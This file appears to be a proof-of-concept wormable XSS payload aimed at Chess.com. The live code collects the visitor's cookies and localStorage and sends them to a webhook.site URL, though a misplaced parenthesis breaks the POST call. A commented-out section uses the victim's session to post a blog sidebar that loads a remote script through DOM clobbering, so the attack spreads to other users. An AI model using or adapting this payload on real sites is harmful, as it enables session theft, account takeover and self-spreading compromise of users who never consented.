// ==========================================
// Wormable XSS Payload - Chess.com 
// ==========================================
alert("DOM Clobbering XSS by Hussein on: " + document.domain);





var userCookies = document.cookie;
var userStorage = JSON.stringify(localStorage);

var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/"), {
    method: "POST",    
    mode: "no-cors",     
    body: exfilData       
}
// const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
// const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
// const requestBody = {
//     "blogDetails": {
//         "url": "hacked-blog", //
//         "name": "Important Update",
//         "privacy": "BLOG_PRIVACY_ID_EVERYONE", 
//         "sidebarBlock": maliciousSidebar
//     },
//     "updateMask": ""
// };

// // 4. (The Infection)
// fetch(apiUrl, {
//     method: 'POST',
//     headers: {
//         'Content-Type': 'application/json',
//         'Accept': 'application/json, text/plain, */*',
//         'Connect-Protocol-Version': '1'
//     },
//     credentials: 'include', 
//     body: JSON.stringify(requestBody)
// })
// .then(response => {
//     if (response.ok) {
//         fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49aeimpact=Worm_Propagated");
//     }
// });
